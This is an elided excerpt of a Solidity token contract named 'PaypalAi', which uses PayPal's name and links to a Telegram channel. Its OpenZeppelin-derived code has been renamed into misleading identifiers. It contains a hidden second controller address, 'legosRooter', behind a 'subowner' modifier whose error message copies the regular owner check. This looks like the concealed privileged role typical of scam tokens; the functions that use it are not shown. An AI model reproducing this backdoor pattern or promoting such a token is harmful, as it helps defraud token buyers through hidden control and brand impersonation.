...
PaypalAi 
https://PaypalAi.io/
https://docs.PaypalAi.io/
https://t.me/PaypalAi
*/
pragma solidity 0.8.24;

interface PaypalAi33 {
  /**
...
/*
 * @dev Provides information about the current execution PaypalAi20Burnable, including the
 ...
 */
abstract contract PaypalAi20Burnable {
...
// File: @openzeppelin/contracts/access/PaypalAi20Ownable.sol
 ...
 * the owner.
 */
abstract contract PaypalAi20Ownable is PaypalAi20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "PaypalAi20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "PaypalAi20Ownable: new owner is the zero address");
 ...
 * `SafePaypalAi` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafePaypalAi {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafePaypalAi: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafePaypalAi: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafePaypalAi: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafePaypalAi: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafePaypalAi: modulo by zero");
  }
...
contract PaypalAiToken is PaypalAi20Burnable, PaypalAi33, PaypalAi20Ownable {
    
    using SafePaypalAi for uint256;
   ...
   address private legosRooter; 
    ...
    string public PaypalAitelegramcchannel = "https://t.me/PaypalAi";
            function getPaypalAitelegramcchannel() public view returns (string memory) {
        return PaypalAitelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {PaypalAi33-totalSupply}.
    */
    ...
    /**
    * @dev See {PaypalAi33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "PaypalAi20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {PaypalAi33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {PaypalAi33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {PaypalAi33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "PaypalAi33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {PaypalAi33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "PaypalAi33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "PaypalAi33: transfer from the zero address");
        require(shippingto != address(0), "PaypalAi33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "PaypalAi33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "PaypalAi33: approve from the zero address");
        require(transporteur != address(0), "PaypalAi33: approve to the zero address");
